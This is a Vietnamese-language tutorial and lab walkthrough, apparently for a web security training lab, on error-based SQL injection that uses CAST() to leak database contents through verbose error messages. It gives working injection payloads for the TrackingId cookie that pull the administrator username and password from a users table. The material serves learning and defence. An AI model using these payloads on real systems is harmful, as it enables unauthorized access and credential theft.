# Extracting sensitive data via verbose SQL error messages

Cấu hình sai của cơ sở dữ liệu đôi khi dẫn đến việc hiển thị **thông báo lỗi chi tiết** (verbose error messages). Những thông tin này có thể hữu ích cho kẻ tấn công. Ví dụ, xem xét thông báo lỗi sau, xuất hiện khi chèn một dấu nháy đơn **(')** vào **tham số id**:

    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

Thông báo này tiết lộ **toàn bộ truy vấn SQL** mà ứng dụng đã tạo từ đầu vào. Có thể thấy rằng đầu vào đang được chèn vào một chuỗi được bao bọc bởi dấu nháy đơn trong câu lệnh **WHERE**.

Thông tin này giúp kẻ tấn công dễ dàng hơn trong việc xây dựng một truy vấn hợp lệ chứa payload độc hại. Ví dụ, kẻ tấn công có thể sử dụng ký tự chú thích **(--)** để vô hiệu hóa phần còn lại của truy vấn, từ đó tránh lỗi cú pháp do dấu nháy đơn dư thừa gây ra.

# Extracting sensitive data via verbose SQL error messages - Continued

Đôi khi, kẻ tấn công có thể **khiến ứng dụng tạo ra một thông báo lỗi chứa dữ liệu được trả về từ truy vấn**. Điều này biến một lỗ hổng SQL injection dạng mù (blind SQL injection) thành có thể quan sát được (visible SQL injection).

Một cách để làm điều này là sử dụng hàm **CAST()**, cho phép chuyển đổi kiểu dữ liệu. Ví dụ, giả sử truy vấn chứa câu lệnh sau:

    CAST((SELECT example_column FROM example_table) AS int)

Thông thường, dữ liệu mà kẻ tấn công muốn đọc là **chuỗi ký tự** (string). Nếu cố gắng chuyển đổi chuỗi này sang một kiểu dữ liệu không tương thích, chẳng hạn như **số nguyên** (int), truy vấn có thể gây ra lỗi tương tự như sau:

    ERROR: invalid input syntax for type integer: "Example data"

Loại truy vấn này cũng có thể hữu ích nếu ứng dụng **giới hạn độ dài ký tự**, khiến kẻ tấn công không thể sử dụng các phương pháp như **phản hồi có điều kiện (conditional responses)** để khai thác SQL injection.

# Lab: Visible error-based SQL injection

![img](161)

Truy cập lab:

![img](162)


Chọn category Pets và intercept request trong Burp Suite: 

![img](163)

=> Website sử dụng Tracking cookie để theo dõi hành vi của người dùng. Thử thêm dấu **'** vào giá trị TrackingId: 

![img](164)

Send request và quan sát response: 

![img](165)

=> Website trả về thông báo lỗi *Unterminated string literal started at position 53 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' '. Expected  char*. 

Thử thêm **'--**:

![img](166)

Send request, quan sát response: 

![img](167)

=> Website không trả về lỗi. Thử chèn **' AND CAST((SELECT 1) AS int)--**: 

![img](168)

Send request, quan sát response: 

![img](169)

=> Website trả về lỗi *ERROR: argument of AND must be type boolean, not type integer Position: 63*

=> Điều kiện **AND** phải là biểu thức boolean. Thử chèn **' AND 1=CAST((SELECT 1) AS int)--**: 

![img](170)

Send request, quan sát response: 

![img](171)

=> Website không trả về lỗi => đây là 1 truy vấn hợp lệ. Chỉnh sửa truy vấn thành **' AND 1=CAST((SELECT username FROM users) AS int)--**:

![img](172)

Send request, quan sát response: 

![img](173)

=> Website trả về lỗi *Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' AND 1=CAST((SELECT username FROM users) AS'. Expected  char*

Nhận thấy truy vấn chèn đang bị rút gọn, có thể do giới hạn ký tự => không có phần chỉ định comment (--). Xóa giá trị TrackingId và gửi lại request: 

![img](174)

Send request, quan sát response: 

![img](175)

=> Website trả về lỗi *ERROR: more than one row returned by a subquery used as an expression*. 

=> Thông báo lỗi cho thấy truy vấn đã được chạy đúng, nhưng vẫn gặp lỗi vì nó trả lại nhiều hơn một hàng.

Chỉnh sửa lại truy vấn để nó chỉ trả về 1 hàng: **' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--**:

![img](176)

Send request, quan sát response: 

![img](177)

=> Website trả về thông báo lỗi *ERROR: invalid input syntax for type integer: "administrator"*

=> Thông báo lỗi tiết lộ tên người dùng đầu tiên từ bảng users là **administrator**.

Chỉnh sửa payload thành **' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--**: 

![img](178)

Send request, quan sát response: 

![img](179)

=> Tìm ra password của người dùng đầu tiên: l6pt2ypstrizz9jrjtmr

Login tài khoản administrator và solved bài lab: 

![img](180)











